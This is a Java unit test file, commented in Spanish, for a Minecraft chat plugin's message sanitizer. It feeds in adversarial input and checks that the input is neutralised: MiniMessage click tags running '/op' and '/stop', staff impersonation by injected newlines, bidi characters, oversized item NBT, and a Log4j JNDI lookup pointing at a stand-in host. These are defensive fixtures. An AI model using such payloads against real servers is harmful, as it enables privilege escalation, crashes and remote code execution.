package dev.betterchats.core;

import dev.betterchats.core.format.FormatPipeline;
import dev.betterchats.core.format.MessageSanitizer;
import dev.betterchats.core.format.TagPolicy;
import dev.betterchats.core.platform.ChatPlayer;
import dev.betterchats.core.platform.PlaceholderBridge;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import net.kyori.adventure.text.format.TextDecoration;
import net.kyori.adventure.text.serializer.plain.PlainTextComponentSerializer;
import org.junit.jupiter.api.Test;

import java.util.Map;
import java.util.Set;
import java.util.UUID;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/** Casos adversariales de inyeccion de MiniMessage (seccion 6 del plan). */
class SecurityTest {

    private final MessageSanitizer sanitizer = new MessageSanitizer();

    private static String plain(Component c) {
        return PlainTextComponentSerializer.plainText().serialize(c);
    }

    /** true si algun nodo del arbol tiene clic, hover o insercion. */
    private static boolean hasInteractivity(Component c) {
        if (c.clickEvent() != null || c.hoverEvent() != null || c.insertion() != null) return true;
        for (Component child : c.children()) if (hasInteractivity(child)) return true;
        return false;
    }

    private static boolean anyColor(Component c) {
        if (c.color() != null) return true;
        for (Component child : c.children()) if (anyColor(child)) return true;
        return false;
    }

    @Test
    void sinEtiquetasTodoEsTextoLiteral() {
        String evil = "<click:run_command:/op yo>pulsa</click> <hover:show_text:'x'>h</hover> <rainbow>r";
        Component c = sanitizer.sanitize(evil, Set.of(), true);
        assertEquals(evil, plain(c));
        assertFalse(hasInteractivity(c));
        assertFalse(anyColor(c));
    }

    @Test
    void colorPermitidoNoAbreClic() {
        String evil = "<red>hola <click:run_command:/op yo>pulsa</click> <hover:show_text:'<red>x'>h</hover>";
        Component c = sanitizer.sanitize(evil, Set.of("color"), true);
        assertFalse(hasInteractivity(c), "click/hover no deben interpretarse");
        assertTrue(anyColor(c), "el color permitido si se aplica");
        assertTrue(plain(c).contains("<click:run_command:/op yo>"), "la etiqueta prohibida queda literal");
    }

    @Test
    void etiquetasAnidadasYEscapes() {
        String evil = "<<red>click:run_command:/stop>x \\<click:run_command:/stop> <insertion:/op>i</insertion> <font:uniform>f";
        Component c = sanitizer.sanitize(evil, Set.of("color", "bold"), true);
        assertFalse(hasInteractivity(c));
    }

    @Test
    void seccionLegacySeElimina() {
        Component c = sanitizer.sanitize("§4§lrojo §kx", Set.of(), true);
        assertEquals("4lrojo kx", plain(c));
        assertFalse(anyColor(c));
    }

    @Test
    void codigosAmpersandSoloSiEstanPermitidos() {
        Component sinPermiso = sanitizer.sanitize("&chola &kx", Set.of(), true);
        assertEquals("&chola &kx", plain(sinPermiso));

        Component conColor = sanitizer.sanitize("&chola &kx", Set.of("color"), true);
        assertEquals("hola &kx", plain(conColor), "&k (obfuscated) no esta permitido y queda literal");
        assertTrue(anyColor(conColor));
    }

    @Test
    void unicodeRaroNoRompe() {
        String s = "\u202Eolleh \u0000 <\u200Bclick:run_command:/op>";
        Component c = sanitizer.sanitize(s, Set.of("color"), true);
        assertFalse(hasInteractivity(c));
    }

    @Test
    void saltosDeLineaEInvisiblesNoPermitenSuplantar() {
        // "\n[Staff] Admin: ..." fingiria un mensaje del staff en otra linea.
        Component c = sanitizer.sanitize("hola\n[Staff] Admin: dame tu clave\r\t", Set.of(), true);
        assertEquals("hola [Staff] Admin: dame tu clave  ", plain(c));
        Component bidi = sanitizer.sanitize("Ad​min ‮olleh⁦x﻿", Set.of(), true);
        assertEquals("Admin ollehx", plain(bidi));
    }

    @Test
    void zalgoSeRecorta() {
        String zalgo = "a" + "́".repeat(50) + "b";
        Component c = sanitizer.sanitize(zalgo, Set.of(), true);
        assertEquals("á́b", plain(c));
    }

    @Test
    void demasiadasEtiquetasVanComoTexto() {
        String spam = "&a&b".repeat(40) + "x";
        Component c = sanitizer.sanitize(spam, Set.of("color"), true);
        assertEquals(spam, plain(c), "por encima del limite no se interpreta nada");
        assertFalse(anyColor(c));
    }

    @Test
    void itemConNbtEnormeNoTiraAlChat() {
        // Libro lleno en la mano + [item]: el JSON pasaria de 32767 bytes y
        // desconectaria a todos los que reciben el mensaje.
        String hugeNbt = "{pages:[\"" + "x".repeat(60000) + "\"]}";
        var rich = dev.betterchats.api.text.RichText.builder("[Libro]")
                .hoverItem(new dev.betterchats.api.text.HoverItem("minecraft:written_book", 1, hugeNbt))
                .hoverText("&7Libro").build();
        Component token = dev.betterchats.core.format.RichTexts.toComponent(rich);
        Component line = Component.text("Pepe: ").append(token);
        assertTrue(dev.betterchats.core.util.PacketSafety.jsonBytes(line) < 30000);

        // Aunque algo cuele un hover gigante, la linea final se recorta.
        Component huge = Component.text("x").hoverEvent(net.kyori.adventure.text.event.HoverEvent
                .showText(Component.text("y".repeat(80000))));
        Component safe = dev.betterchats.core.util.PacketSafety.limit(Component.text("Pepe: ").append(huge));
        assertTrue(dev.betterchats.core.util.PacketSafety.jsonBytes(safe) <= 30000);
        assertEquals("Pepe: x", plain(safe));
    }

    @Test
    void lookupsDeLog4jBloqueados() {
        var filter = new dev.betterchats.core.filter.LookupFilter(() -> true, () -> "no");
        var ctx = new dev.betterchats.api.filter.ChatContext(new dev.betterchats.api.PlayerRef(UUID.randomUUID(), "x"),
                dev.betterchats.api.filter.MessageKind.TEAM, "default", null,
                "hola ${jndi:ldap://evil/a}", 1, 0, p -> true);
        assertEquals(dev.betterchats.api.filter.FilterResult.Action.CANCEL, filter.filter(ctx).getAction());
    }

    @Test
    void politicaQuitaEtiquetasProtegidasDeLasListas() {
        Set<String> allowed = TagPolicy.allowedTags(Set.of("click", "hover", "color", "format"), Set.of("font"),
                "betterchats.tags.all", perm -> false);
        assertFalse(allowed.contains("click"));
        assertFalse(allowed.contains("hover"));
        assertFalse(allowed.contains("font"));
        assertTrue(allowed.containsAll(Set.of("color", "gradient", "bold", "italic")));
    }

    @Test
    void politicaConPermisos() {
        Set<String> conClick = TagPolicy.allowedTags(Set.of(), Set.of(), "betterchats.tags.all",
                perm -> perm.equals("betterchats.tags.click"));
        assertEquals(Set.of("click"), conClick);

        Set<String> bypass = TagPolicy.allowedTags(Set.of(), Set.of(), "betterchats.tags.all",
                perm -> perm.equals("betterchats.tags.all"));
        assertTrue(bypass.contains("hover") && bypass.contains("click"));

        Set<String> formato = TagPolicy.allowedTags(Set.of(), Set.of(), "betterchats.tags.all",
                perm -> perm.equals("betterchats.tags.format"));
        assertEquals(Set.of("bold", "italic", "underlined", "strikethrough"), formato);
    }

    @Test
    void plantillaNoInterpretaNombresNiPlaceholderApi() {
        FormatPipeline pipeline = new FormatPipeline();
        ChatPlayer subject = new FakePlayer(UUID.randomUUID(), "Pepe");
        PlaceholderBridge papi = new PlaceholderBridge() {
            @Override
            public boolean isAvailable() {
                return true;
            }

            @Override
            public String apply(ChatPlayer player, String text) {
                return text.equals("%nick%") ? "&a<click:run_command:/op>Nick" : text;
            }
        };
        Component body = Component.text("hola");
        Component line = pipeline.render("<gray>%nick% {playerName} <dark_gray>» <white>{message}",
                Map.of("playerName", "<hover:show_text:'x'><click:run_command:/stop>Evil"),
                Map.of("message", body), subject, papi, null, true);
        assertFalse(hasInteractivity(line));
        String text = plain(line);
        assertTrue(text.contains("<click:run_command:/op>Nick"), text);
        assertTrue(text.contains("<hover:show_text:'x'><click:run_command:/stop>Evil"), text);
        assertTrue(text.endsWith("» hola"), text);
    }

    @Test
    void colorDelPrefijoDePapiSigueAplicandoComoEnLegacy() {
        FormatPipeline pipeline = new FormatPipeline();
        PlaceholderBridge papi = new PlaceholderBridge() {
            @Override
            public boolean isAvailable() {
                return true;
            }

            @Override
            public String apply(ChatPlayer player, String text) {
                return text.equals("%vault_prefix%") ? "§c[Admin] §f" : text;
            }
        };
        Component line = pipeline.render("&7%vault_prefix%{playerName}&8: {message}",
                Map.of("playerName", "Pepe"), Map.of("message", Component.text("hola")),
                new FakePlayer(UUID.randomUUID(), "Pepe"), papi, null, true);
        assertEquals("[Admin] Pepe: hola", plain(line));
        Component name = findText(line, "Pepe");
        assertEquals(NamedTextColor.WHITE, effectiveColor(line, name));
    }

    @Test
    void argumentosDePapiLleganSinConvertir() {
        // Caso real: changeoutput con "§e⚠" como argumento salia como "<yellow>⚠".
        FormatPipeline pipeline = new FormatPipeline();
        String ph = "%changeoutput_equals_input:_matcher:{deluxetags_tag}_ifmatch:§e⚠_else:{deluxetags_tag}%";
        java.util.List<String> recibidos = new java.util.ArrayList<>();
        PlaceholderBridge papi = new PlaceholderBridge() {
            @Override
            public boolean isAvailable() {
                return true;
            }

            @Override
            public String apply(ChatPlayer player, String text) {
                recibidos.add(text);
                if (text.startsWith("%changeoutput")) {
                    return text.substring(text.indexOf("_ifmatch:") + 9, text.indexOf("_else:"));
                }
                return text.equals("%ezcolors_color%") ? "&b" : text;
            }
        };
        Component line = pipeline.render("&f[" + ph + "&f] &f{playerName} &8» &7%ezcolors_color%{message}",
                Map.of("playerName", "V3lez"), Map.of("message", Component.text("sd")),
                new FakePlayer(UUID.randomUUID(), "V3lez"), papi, null, true);
        assertEquals(ph, recibidos.get(0), "PlaceholderAPI recibe el placeholder original");
        assertEquals("[⚠] V3lez » sd", plain(line));
        assertEquals(NamedTextColor.YELLOW, effectiveColor(line, findText(line, "⚠")));
        assertEquals(NamedTextColor.AQUA, effectiveColor(line, findText(line, "sd")),
                "el color de %ezcolors_color% se aplica al mensaje");
    }

    @Test
    void codigosSeccionEnPlantillaYLang() {
        FormatPipeline pipeline = new FormatPipeline();
        Component line = pipeline.render("§aOk {message}", Map.of(), Map.of("message", Component.text("x")),
                null, null, null, true);
        assertEquals("Ok x", plain(line));
        assertTrue(anyColor(line));

        var lang = new dev.betterchats.core.config.Lang(Map.of("prefix", "&8[&bBC&8] &7", "k", "<prefix>&cHola"), true);
        Component c = lang.get("k");
        assertEquals("[BC] Hola", plain(c));
        assertTrue(anyColor(c));
    }

    @Test
    void plantillaConvierteLegacy() {
        FormatPipeline pipeline = new FormatPipeline();
        Component line = pipeline.render("&c&lStaff &7{message}", Map.of(), Map.of("message", Component.text("x")),
                null, null, null, true);
        assertEquals("Staff x", plain(line));
        // El primer hijo con texto "Staff" debe ser rojo y negrita.
        Component staff = findText(line, "Staff ");
        assertEquals(NamedTextColor.RED, staff == null ? null : effectiveColor(line, staff));
        assertTrue(staff != null && staff.hasDecoration(TextDecoration.BOLD) || line.hasDecoration(TextDecoration.BOLD));
    }

    private static Component findText(Component root, String content) {
        if (root instanceof net.kyori.adventure.text.TextComponent t && t.content().equals(content)) return root;
        for (Component child : root.children()) {
            Component f = findText(child, content);
            if (f != null) return f;
        }
        return null;
    }

    private static NamedTextColor effectiveColor(Component root, Component target) {
        // Busca el color mas cercano en el camino hasta el nodo.
        return colorOnPath(root, target, null);
    }

    private static NamedTextColor colorOnPath(Component node, Component target, NamedTextColor inherited) {
        NamedTextColor here = node.color() instanceof NamedTextColor n ? n : inherited;
        if (node == target) return here;
        for (Component child : node.children()) {
            NamedTextColor r = colorOnPath(child, target, here);
            if (r != null && containsNode(child, target)) return r;
        }
        return null;
    }

    private static boolean containsNode(Component node, Component target) {
        if (node == target) return true;
        for (Component c : node.children()) if (containsNode(c, target)) return true;
        return false;
    }

    record FakePlayer(UUID uuid, String name) implements ChatPlayer {
        @Override public String displayName() { return name; }
        @Override public boolean hasPermission(String permission) { return false; }
        @Override public void sendMessage(Component message) { }
        @Override public boolean isOnline() { return true; }
        @Override public PlayerLocation location() { return PlayerLocation.UNKNOWN; }
    }
}
